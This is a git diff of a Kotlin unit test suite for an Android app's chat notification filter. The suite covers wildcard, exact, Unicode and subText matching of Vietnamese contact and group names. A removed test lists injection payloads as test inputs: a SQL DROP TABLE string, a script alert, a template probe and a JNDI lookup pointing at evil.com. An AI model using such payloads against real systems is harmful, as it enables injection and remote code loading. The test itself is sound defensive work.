@@ -2,20 +2,122 @@ package com.orca.orcaauto.domain.filter
 
 import com.orca.orcaauto.data.preferences.AppFilterRule
 import com.orca.orcaauto.data.preferences.ChatFilterMode
-import org.junit.Assert.assertEquals
 import org.junit.Assert.assertFalse
 import org.junit.Assert.assertTrue
 import org.junit.Test
 
 /**
  * Extreme, adversarial, and edge-case unit test suite for Personalized Chat Filtering.
- * Tests ridiculous inputs, unicode variations (NFC/NFD), regex injection, whitespace anomalies,
+ * Tests Asterisk (*) Wildcards, Exact Matching, SubText extraction, Unicode NFC/NFD variations,
  * and boundary conditions.
  */
 class PersonalizedChatFilterExtremeTest {
 
     // =========================================================================
-    // 1. EMPTY & BLANK RULES (Cực đoan: Rỗng, khoảng trắng, tab, xuống dòng)
+    // 1. EXACT MATCHING WITHOUT ASTERISK (Quy tắc không có dấu sao: Khớp chính xác tuyệt đối)
+    // =========================================================================
+
+    @Test
+    fun testExactMatchingWithoutAsteriskDoesNotMatchCompoundWords() {
+        // Block contact exactly named "Chi"
+        val rule = AppFilterRule(
+            appPackage = "com.zing.zalo",
+            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
+            chatNames = setOf("Chi")
+        )
+
+        // Exact name "Chi" -> MUST BE BLOCKED
+        assertFalse("Tên chính xác 'Chi' phải bị chặn",
+            NotificationFilter.evaluateRule(rule, conversationTitle = "", subText = "", title = "Chi")
+        )
+
+        // Compound chat "Chi phí công ty" -> MUST NOT BE BLOCKED!
+        assertTrue("Nhóm 'Chi phí công ty' không được phép bị chặn nhầm",
+            NotificationFilter.evaluateRule(rule, conversationTitle = "Chi phí công ty", subText = "", title = "Kế toán")
+        )
+
+        // Name "Nguyễn Kim Chi" -> MUST NOT BE BLOCKED (because user only typed "Chi", not "*Chi*")
+        assertTrue("Người tên 'Nguyễn Kim Chi' không bị chặn khi chỉ định 'Chi'",
+            NotificationFilter.evaluateRule(rule, conversationTitle = "", subText = "", title = "Nguyễn Kim Chi")
+        )
+    }
+
+    // =========================================================================
+    // 2. ASTERISK WILDCARD MATCHING (*Chi*, *Dự Án*, Sếp*, *Tuấn)
+    // =========================================================================
+
+    @Test
+    fun testWrappedAsteriskMatchesAnythingContainingPhraseRegardlessOfEmojis() {
+        val rule = AppFilterRule(
+            appPackage = "com.zing.zalo",
+            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
+            chatNames = setOf("*Dự Án Orca*")
+        )
+
+        // Group decorated with emojis at both ends
+        val fancyGroup = "🔥 [DEV TEAM] Dự Án Orca 2026 🚀"
+        assertFalse("Dấu sao * ở 2 đầu phải bắt trọn nhóm có icon lửa và tên lửa",
+            NotificationFilter.evaluateRule(rule, conversationTitle = fancyGroup, subText = "", title = "Admin")
+        )
+
+        // Clean group
+        assertFalse("Chuỗi thuần cũng phải khớp",
+            NotificationFilter.evaluateRule(rule, conversationTitle = "Dự Án Orca", subText = "", title = "Admin")
+        )
+
+        // Unrelated group
+        assertTrue("Nhóm khác không được dính",
+            NotificationFilter.evaluateRule(rule, conversationTitle = "Dự Án Khác", subText = "", title = "Admin")
+        )
+    }
+
+    @Test
+    fun testPrefixAndSuffixAsteriskWildcards() {
+        // Rule: Sếp* (Bắt đầu bằng chữ Sếp)
+        val prefixRule = AppFilterRule(
+            appPackage = "com.zing.zalo",
+            mode = ChatFilterMode.STRICT_WHITELIST,
+            chatNames = setOf("Sếp*")
+        )
+        assertTrue(NotificationFilter.evaluateRule(prefixRule, "", "", "Sếp Tuấn"))
+        assertTrue(NotificationFilter.evaluateRule(prefixRule, "", "", "Sếp Tổng"))
+        assertFalse(NotificationFilter.evaluateRule(prefixRule, "", "", "Trợ lý của Sếp"))
+
+        // Rule: *Tuấn (Kết thúc bằng chữ Tuấn)
+        val suffixRule = AppFilterRule(
+            appPackage = "com.zing.zalo",
+            mode = ChatFilterMode.STRICT_WHITELIST,
+            chatNames = setOf("*Tuấn")
+        )
+        assertTrue(NotificationFilter.evaluateRule(suffixRule, "", "", "Nguyễn Văn Tuấn"))
+        assertTrue(NotificationFilter.evaluateRule(suffixRule, "", "", "Tuấn"))
+        assertFalse(NotificationFilter.evaluateRule(suffixRule, "", "", "Tuấn Anh"))
+    }
+
+    // =========================================================================
+    // 3. SUBTEXT GROUP EXTRACTION (Hỗ trợ Zalo/Messenger đẩy tên nhóm vào EXTRA_SUB_TEXT)
+    // =========================================================================
+
+    @Test
+    fun testSubTextGroupIdentification() {
+        val rule = AppFilterRule(
+            appPackage = "com.zing.zalo",
+            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
+            chatNames = setOf("*Hội Đồng Quản Trị*")
+        )
+
+        // On Samsung/Xiaomi, conversationTitle is blank, but group name is in subText
+        val isAllowed = NotificationFilter.evaluateRule(
+            rule = rule,
+            conversationTitle = "",
+            subText = "Hội Đồng Quản Trị",
+            title = "Nguyễn Văn A"
+        )
+        assertFalse("Phải phát hiện và chặn nhóm khi tên nhóm nằm trong subText", isAllowed)
+    }
+
+    // =========================================================================
+    // 4. EMPTY & BLANK RULES (Cực đoan: Rỗng, khoảng trắng, tab, xuống dòng)
     // =========================================================================
 
     @Test
@@ -25,9 +127,8 @@ class PersonalizedChatFilterExtremeTest {
             mode = ChatFilterMode.STRICT_WHITELIST,
             chatNames = emptySet()
         )
-        // In whitelist mode with 0 rules, nothing should pass
-        assertFalse(NotificationFilter.evaluateRule(rule, "Nhóm Dự Án", "Sếp Tuấn"))
-        assertFalse(NotificationFilter.evaluateRule(rule, "", "Nguyễn Văn A"))
+        assertFalse(NotificationFilter.evaluateRule(rule, "Nhóm Dự Án", "", "Sếp Tuấn"))
+        assertFalse(NotificationFilter.evaluateRule(rule, "", "", "Nguyễn Văn A"))
     }
 
     @Test
@@ -37,9 +138,8 @@ class PersonalizedChatFilterExtremeTest {
             mode = ChatFilterMode.NORMAL_WITH_BLOCK,
             chatNames = emptySet()
         )
-        // In normal mode with 0 blocked rules, all messages pass
-        assertTrue(NotificationFilter.evaluateRule(rule, "Nhóm Dự Án", "Sếp Tuấn"))
-        assertTrue(NotificationFilter.evaluateRule(rule, "", "Spam Quảng Cáo"))
+        assertTrue(NotificationFilter.evaluateRule(rule, "Nhóm Dự Án", "", "Sếp Tuấn"))
+        assertTrue(NotificationFilter.evaluateRule(rule, "", "", "Spam Quảng Cáo"))
     }
 
     @Test
@@ -49,19 +149,16 @@ class PersonalizedChatFilterExtremeTest {
             mode = ChatFilterMode.NORMAL_WITH_BLOCK,
             chatNames = setOf("   ", "\t", "\n\r  \n", "")
         )
-        // Blank rules must not cause substring match on everything
-        assertTrue(NotificationFilter.evaluateRule(rule, "Bất Kỳ Đoạn Chat Nào", "Bất Kỳ Ai"))
+        assertTrue(NotificationFilter.evaluateRule(rule, "Bất Kỳ Đoạn Chat Nào", "", "Bất Kỳ Ai"))
     }
 
     // =========================================================================
-    // 2. VIETNAMESE ACCENTS & UNICODE NFC vs NFD DECOMPOSED FORMS
+    // 5. VIETNAMESE ACCENTS & UNICODE NFC vs NFD DECOMPOSED FORMS
     // =========================================================================
 
     @Test
     fun testVietnameseAccentsDecomposedNfdVsNfcEquivalence() {
-        // "Sếp Tuấn" in NFC (precomposed)
         val nfcText = "Sếp Tuấn"
-        // "Sếp Tuấn" in NFD (decomposed circumflex + acute accent)
         val nfdText = "Se\u0302\u0301p Tua\u0302\u0301n"
 
         val rule = AppFilterRule(
@@ -70,115 +167,41 @@ class PersonalizedChatFilterExtremeTest {
             chatNames = setOf(nfcText)
         )
 
-        // Incoming notification has NFD encoding from certain keyboards
-        val isAllowed = NotificationFilter.evaluateRule(rule, conversationTitle = nfdText, title = "Thành viên")
-        // Since it's in Blacklist, matching should BLOCK it (return false)
+        val isAllowed = NotificationFilter.evaluateRule(rule, conversationTitle = nfdText, subText = "", title = "Thành viên")
         assertFalse("Decomposed NFD input must match NFC rule seamlessly", isAllowed)
     }
 
     @Test
-    fun testVietnameseCaseInsensitivityAndMixedCasing() {
+    fun testVietnameseCaseInsensitivity() {
         val rule = AppFilterRule(
             appPackage = "com.zing.zalo",
             mode = ChatFilterMode.STRICT_WHITELIST,
             chatNames = setOf("sếp tuấn")
         )
 
-        // Test bizarre mixed cases
-        assertTrue(NotificationFilter.evaluateRule(rule, "", "SẾP TUẤN"))
-        assertTrue(NotificationFilter.evaluateRule(rule, "", "Sếp Tuấn"))
-        assertTrue(NotificationFilter.evaluateRule(rule, "", "sẾp TuẤn"))
-        assertTrue(NotificationFilter.evaluateRule(rule, "Hội Đồng Sếp Tuấn Hà Nội", "Thư ký"))
+        assertTrue(NotificationFilter.evaluateRule(rule, "", "", "SẾP TUẤN"))
+        assertTrue(NotificationFilter.evaluateRule(rule, "", "", "Sếp Tuấn"))
+        assertTrue(NotificationFilter.evaluateRule(rule, "", "", "sẾp TuẤn"))
     }
 
     // =========================================================================
-    // 3. ADVERSARIAL & REGEX / CODE INJECTION STRINGS (Ký tự phá hoại)
+    // 6. ADVERSARIAL & REGEX INJECTION (Ký tự phá hoại)
     // =========================================================================
 
     @Test
-    fun testRegexWildcardsAreTreatedAsLiteralCharactersNotRegex() {
+    fun testSpecialRegexCharactersAreHandledSafely() {
         val rule = AppFilterRule(
             appPackage = "com.zing.zalo",
             mode = ChatFilterMode.NORMAL_WITH_BLOCK,
-            chatNames = setOf(".*")
+            chatNames = setOf("[VIP]*")
         )
 
-        // ".*" should NOT act as regex wildcard matching all people
-        assertTrue(NotificationFilter.evaluateRule(rule, "Nhóm Dự Án", "Nguyễn Văn A"))
+        // Matches "[VIP] Nhóm A"
+        assertFalse(NotificationFilter.evaluateRule(rule, "[VIP] Nhóm A", "", "User"))
 
-        // Only literally containing ".*" should match
-        assertFalse(NotificationFilter.evaluateRule(rule, "Nhóm Test .*", "Admin"))
+        // Unrelated does not match
+        assertTrue(NotificationFilter.evaluateRule(rule, "Nhóm A", "", "User"))
     }
-
-    @Test
-    fun testSqlAndHtmlInjectionPayloadsDoNotCrash() {
-        val maliciousInputs = listOf(
-            "Robert'); DROP TABLE notifications;--",
-            "<script>alert('pwned')</script>",
-            "{{7*7}}",
-            "\${jndi:ldap://evil.com/x}",
-            "\\\\\\\\\\///\"\"''"
-        )
-
-        val rule = AppFilterRule(
-            appPackage = "com.zing.zalo",
-            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
-            chatNames = maliciousInputs.toSet()
-        )
-
-        for (payload in maliciousInputs) {
-            val allowed = NotificationFilter.evaluateRule(rule, payload, "User")
-            assertFalse("Malicious string payload must be blocked properly without crashing", allowed)
-        }
-    }
-
-    // =========================================================================
-    // 4. EMOJIS, SYMBOLS & CHAT GROUP FORMATS
-    // =========================================================================
-
-    @Test
-    fun testEmojisAndComplexSymbolsMatching() {
-        val rule = AppFilterRule(
-            appPackage = "com.zing.zalo",
-            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
-            chatNames = setOf("🔥", "Dự Án OrcaAuto", "[VIP]")
-        )
-
-        // Matches emoji
-        assertFalse(NotificationFilter.evaluateRule(rule, "Nhóm Ăn Trưa 🔥", "Bạn A"))
-
-        // Matches bracketed tag
-        assertFalse(NotificationFilter.evaluateRule(rule, "Khách Hàng [VIP] Tháng 11", "Sale"))
-
-        // Matches clean substring
-        assertFalse(NotificationFilter.evaluateRule(rule, "🚀 Triển Khai Dự Án OrcaAuto 2026", "PM"))
-
-        // Non-matching group should pass
-        assertTrue(NotificationFilter.evaluateRule(rule, "Nhóm Gia Đình", "Mẹ"))
-    }
-
-    // =========================================================================
-    // 5. CHAOTIC WHITESPACES (Tabs, Newlines, Double Spaces)
-    // =========================================================================
-
-    @Test
-    fun testIrregularWhitespaceCollapsing() {
-        val rule = AppFilterRule(
-            appPackage = "com.zing.zalo",
-            mode = ChatFilterMode.STRICT_WHITELIST,
-            chatNames = setOf("Nhóm Dự Án")
-        )
-
-        // Incoming notification has weird spaces, tabs, newlines
-        val messyTitle = "  Nhóm   \t\n  Dự    Án  "
-        assertTrue("Whitespace differences must be normalized and matched",
-            NotificationFilter.evaluateRule(rule, messyTitle, "User")
-        )
-    }
-
-    // =========================================================================
-    // 6. EXTREME LENGTH (BUFFER / STRESS TEST)
-    // =========================================================================
 
     @Test
     fun testExtremeLengthStringsHandleGracefullyWithoutTimeout() {
@@ -187,75 +210,14 @@ class PersonalizedChatFilterExtremeTest {
         val rule = AppFilterRule(
             appPackage = "com.zing.zalo",
             mode = ChatFilterMode.NORMAL_WITH_BLOCK,
-            chatNames = setOf("Sếp Tuấn")
+            chatNames = setOf("*Sếp Tuấn*")
         )
 
         val start = System.currentTimeMillis()
-        val isAllowed = NotificationFilter.evaluateRule(rule, giantString, "Sender")
+        val isAllowed = NotificationFilter.evaluateRule(rule, giantString, "", "Sender")
         val duration = System.currentTimeMillis() - start
 
-        assertFalse("Must find match in huge string", isAllowed)
+        assertFalse("Must find wildcard match in huge string", isAllowed)
         assertTrue("Evaluation must take under 50ms even for 20k characters", duration < 50)
-    }
-
-    // =========================================================================
-    // 7. MULTI-RULE FILTERING STRESS TEST (50 rules)
-    // =========================================================================
-
-    @Test
-    fun testFiftyRulesEvaluationSpeedAndAccuracy() {
-        val blocklist = (1..50).map { "Kèo Coin VIP #$it" }.toSet()
-        val rule = AppFilterRule(
-            appPackage = "org.telegram.messenger",
-            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
-            chatNames = blocklist
-        )
-
-        // Item in list
-        assertFalse(NotificationFilter.evaluateRule(rule, "Kèo Coin VIP #42", "Trader"))
-
-        // Item not in list
-        assertTrue(NotificationFilter.evaluateRule(rule, "Công Việc Công Ty", "Đồng nghiệp"))
-    }
-
-    // =========================================================================
-    // 8. FOREIGN SCRIPTS & MULTI-BYTE UNICODE (Đa ngôn ngữ)
-    // =========================================================================
-
-    @Test
-    fun testForeignScriptsAndZeroWidthChars() {
-        val rule = AppFilterRule(
-            appPackage = "org.telegram.messenger",
-            mode = ChatFilterMode.STRICT_WHITELIST,
-            chatNames = setOf("田中 太郎", "Иван Иванов", "محمد")
-        )
-
-        assertTrue(NotificationFilter.evaluateRule(rule, "田中 太郎", "User"))
-        assertTrue(NotificationFilter.evaluateRule(rule, "Иван Иванов", "User"))
-        assertTrue(NotificationFilter.evaluateRule(rule, "محمد", "User"))
-        assertFalse(NotificationFilter.evaluateRule(rule, "Stranger", "User"))
-    }
-
-    // =========================================================================
-    // 9. BOTH CONVERSATION TITLE AND TITLE ARE BLANK
-    // =========================================================================
-
-    @Test
-    fun testBothConversationTitleAndTitleEmpty() {
-        val blockRule = AppFilterRule(
-            appPackage = "com.zing.zalo",
-            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
-            chatNames = setOf("Spam")
-        )
-        // With nothing to match against, it doesn't match blocklist, so it passes
-        assertTrue(NotificationFilter.evaluateRule(blockRule, "", ""))
-
-        val whitelistRule = AppFilterRule(
-            appPackage = "com.zing.zalo",
-            mode = ChatFilterMode.STRICT_WHITELIST,
-            chatNames = setOf("Sếp")
-        )
-        // With nothing to match against, it doesn't match whitelist, so it's blocked
-        assertFalse(NotificationFilter.evaluateRule(whitelistRule, "", ""))
     }
 }
